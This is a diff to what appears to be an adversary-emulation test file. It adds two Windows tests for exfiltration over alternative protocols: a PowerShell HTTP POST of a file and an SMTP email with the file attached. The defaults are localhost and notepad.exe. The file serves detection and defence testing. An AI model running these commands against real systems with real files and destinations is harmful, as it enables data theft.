@@ -67,3 +67,52 @@ atomic_tests:
       
           cat output_file | cut -d "A" -f 2 | cut -d " " -f 2 | cut -d "." -f 1 | sort | uniq | xxd -p -r
     name: manual
+- name: Exfiltration Over Alternative Protocol - HTTP
+  auto_generated_guid: 6aa58451-1121-4490-a8e9-1dada3f1c68c
+  description: |
+     Exfiltration of specified file over HTTP.
+     Upon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+     $content = Get-Content #{input_file}
+     Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content
+    name: powershell
+  input_arguments:
+    input_file:
+      description: Path to file to exfiltrate
+      type: Path
+      default: C:\Windows\System32\notepad.exe
+    ip_address:
+      description: Destination IP address where the data should be sent
+      type: String
+      default: http://127.0.0.1
+- name: Exfiltration Over Alternative Protocol - SMTP
+  auto_generated_guid: ec3a835e-adca-4c7c-88d2-853b69c11bb9
+  description: |
+     Exfiltration of specified file over SMTP.
+     Upon successful execution, powershell will send an email with attached file to exfiltrateto a remote address. Results will be via stdout.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+     Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1048.003 Atomic Test" -Attachments #{input_file} -SmtpServer #{smtp_server}
+    name: powershell
+  input_arguments:
+    input_file:
+      description: Path to file to exfiltrate
+      type: Path
+      default: C:\Windows\System32\notepad.exe
+    sender:
+      description: The email address of the sender
+      type: String
+      default: "test@corp.com"
+    receiver:
+      description: The email address of the receiver
+      type: String
+      default: "test@corp.com"
+    smtp_server:
+      description: SMTP server to use for email transportation
+      type: String
+      default: "127.0.0.1"
